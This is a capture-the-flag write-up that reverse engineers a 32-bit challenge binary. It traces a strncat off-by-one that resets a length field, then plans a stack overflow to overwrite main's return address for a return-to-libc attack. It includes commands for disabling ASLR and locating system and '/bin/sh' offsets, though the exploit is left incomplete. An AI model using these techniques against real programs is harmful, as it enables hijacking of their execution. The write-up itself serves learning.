Reverse Engineering
===================
main initializes 4 local variables:

1. A 48 bytes buffer. Probabely for the bullet description:
```assembly
push    30h
push    0
lea     eax, [ebp-0x34]
push    eax
```

2. The wolf's HP:
```assembly
mov     [ebp-0x3C], 7FFFFFFFh
```

I assume that's the wolf's HP since it matches the value we get when we try to kill the wolf (2147483647). This is the maximum positive value for a 32-bit signed integer.

Idea: If the input function overflows, we might be able to override
the Wolf's HP with our own value.

3. The wolf's name:
```assembly
mov     [ebp-0x34], offset aGin ; "Gin"
```

As assumed, before calling the create_bullet function, a pointer
to the 48 bytes buffer is pused to the stack. create_bullet uses
it to store the bullet description from the user:

```assembly
push    offset aGiveMeYourDesc ; "Give me your description of bullet :"
call    printf
add     esp, 4
mov     eax, [ebp+arg_0]
push    30h
push    eax
call    read_input
```

read_input uses the read system call to read upto 48 bytes from
the user (30h) so our buffer won't overflow to the wolf's HP.
In case the input ends with '\n', it replaces it with NULL.

create_input then calls strlen to get the length of the input
```assembly
and stores the result in:
mov     [eax+30h], edx
```

Since eax at that point points to a stack variable of main,
I assume that the length is written to the forth local variable of
main, which is stored in [ebp-0x4].

Let's move on the the power_up function.
power_up receives a pointer to the 48 bytes buffer as an argument.
It first initializes a local buffer of 48 bytes to zero.
It than checks if the length of the bullet description we entered
before is lower than 47 bytes (0x2F). If it is, it allows us to "power up".

Description of the power up process:

1. reads input with maximum size of 48-(length of our desc)
and stores it in a local buffer:

```assembly
mov     eax, [ebp+bullet_desc]
mov     eax, [eax+30h]
mov     edx, 30h
sub     edx, eax
mov     eax, edx
push    eax
lea     eax, [ebp+local_desc_buffer]
push    eax
call    read_input
```

2. Appends upto 48-(length of our desc) bytes from the local
buffer to our description buffer: 
```assembly
mov     eax, [ebp+bullet_desc]
mov     eax, [eax+30h]
mov     edx, 30h
sub     edx, eax
mov     eax, [ebp+bullet_desc]
push    edx
lea     edx, [ebp+local_desc_buffer]
push    edx
push    eax
call    strncat
```

There's a bug here since we append 48-(length of our desc) bytes even
if the new description is shorter.

strncat appends the first num characters of source to destination, plus
a terminating null-character. This means that if our original description
is 45 bytes long, and our new description is 3 bytes, strncat will override
the description length value of the struct with NULL.

3. Calculates and stores the new buffer size on [eax+30h]:

```assembly
lea     eax, [ebp+local_desc_buffer]
push    eax
call    strlen
add     esp, 4
mov     edx, eax
mov     eax, [ebp+bullet_desc]
mov     eax, [eax+30h]
add     eax, edx
mov     [ebp+local_desc_length], eax
push    [ebp+local_desc_length]
push    offset aYourNewPowerIs ; "Your new power is : %u\n"
call    printf
add     esp, 8
mov     eax, [ebp+bullet_desc]
mov     edx, [ebp+local_desc_length]
mov     [eax+30h], edx
```

Let's move on to the beat function.
It gets the wolf's HP and our bullet description as parameters.
It then substructs our HP (desc length) from the wolf's HP, updates the worf's
HP with the substruction value and if that number is lower than zero we win.

Theoretically we could call the beat function in a loop until the wolf's HP
will reach zero, but since there's a 1 second sleep in the beat function,
this solution is not practical. We need to find how to have a very large value.

Exploitation
============
Once we identified this vulnerability of using strncat the wrong way,
it's clear that we can write the following exploit:

1. Fill the buffer with 45 bytes.

2. Append 3 bytes so strncat will override the bullet length with 0
when it's actually 48 bytes + '/0'. This will result in the a new legth of 3
(0+3) instead of 48 (45+3), allowing us to append once more and overflow.

3. Read an additional 11 bytes and append them to the bullet description.
Since the bullet description is stored on main's stack frame,
we'll be able to override the return address from main and hiject execution.

The first 3 bytes on the input will override the high 2 bytes of the current
length (the lower bytes will be 0x3). Those three bytes should be 0xFFFFFF
so we'll be able to beat the wolf and return from main.

The next 4 bytes can be anything as they'll override the stored ebp.
the last 4 bytes should contain our return address.

Main's stack frame:
```
0xffffd2dc	return address
0xffffd2d8	saved ebp
0xffffd2d4	bullet length
0xffffd2d0	bullet desc
0xffffd2cc	bullet desc
0xffffd2c8	bullet desc
0xffffd2c4	bullet desc
0xffffd2c0	bullet desc
0xffffd2bc	bullet desc
0xffffd2b8	bullet desc
0xffffd2b4	bullet desc
0xffffd2b0	bullet desc
0xffffd2ac	bullet desc
0xffffd2a8	bullet desc
0xffffd2a4	bullet desc
0xffffd2a0	wolf's name
0xffffd29c	wolf's hp
```

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL

[FULL RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/)
makes the entire GOT read-only which removes the ability to perform
a "GOT overwrite" attack, where the GOT address of a function is overwritten
with the location of another function or a ROP gadget an attacker wants to run.

[NX](https://ctf101.org/binary-exploitation/no-execute/)
(also known as Data Execution Prevention or DEP)
marks certain areas of the program as not executable, meaning that stored input
or data cannot be executed as code. This is significant because it prevents
attackers from being able to jump to custom shellcode that they've stored on
the stack or in a global variable.

In addition, ASLR is enabled on the remote machine.

Let's evaluate our exploitation options:

1. Since the program is complied with NX, we won't be able to execute a shellcode
direclty from the stack.

2. The program doesn't import the "system" function, so we can't override the return address to point to such call instruction, providing our own arguments.

3. We can jump to the address of system in libc's, but since ASLR is enabled, we'll need to find someway to leak libc's base address.

4. Since the original return address of main points to \_\_libc_start_main, we might be able to partially override the return address to make it point to somewhere else within libc.

5. We can try and brute force libc's base address.

Since the 3rd option seems simplest, I'll advance in that direction and
deal with ASLR later. I'll first develop the exploit using my own libc.

Temporarily disable ASLR:
```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

Find the offset of system in libc:
```
> ldd ./silver_bullet
linux-gate.so.1 (0xf7fc8000)
libc.so.6 => /lib32/libc.so.6 (0xf7dc8000)
/lib/ld-linux.so.2 (0xf7fca000)

>readelf -s /lib32/libc.so.6 | grep system@
652: 0003d7e0    55 FUNC    GLOBAL DEFAULT   13 \_\_libc_system@@GLIBC_PRIVATE
1510: 0003d7e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Or using pwntools:
```python
from pwn import *

libc = ELF('libc.so')
system_off = libc.symbols['system']
```

Find the offset of "/bin/sh" in libc:
```
> strings -tx /lib32/libc.so.6 | grep /bin/sh
17c968 /bin/sh
```